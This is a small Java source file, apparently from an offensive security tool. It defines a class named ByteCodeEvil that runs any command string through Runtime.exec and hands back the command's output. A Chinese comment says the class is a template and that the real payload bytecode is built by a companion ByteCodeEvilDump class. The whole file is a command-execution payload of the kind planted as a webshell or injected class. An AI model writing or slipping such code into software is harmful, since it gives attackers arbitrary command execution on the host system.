package org.sec.core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * 代码并没有使用的该类
 * 实际上字节码的构造基于ByteCodeEvilDump类
 */
public class ByteCodeEvil {
    String res;

    public ByteCodeEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        this.res = stringBuilder.toString();
    }

    public String toString() {
        return this.res;
    }
}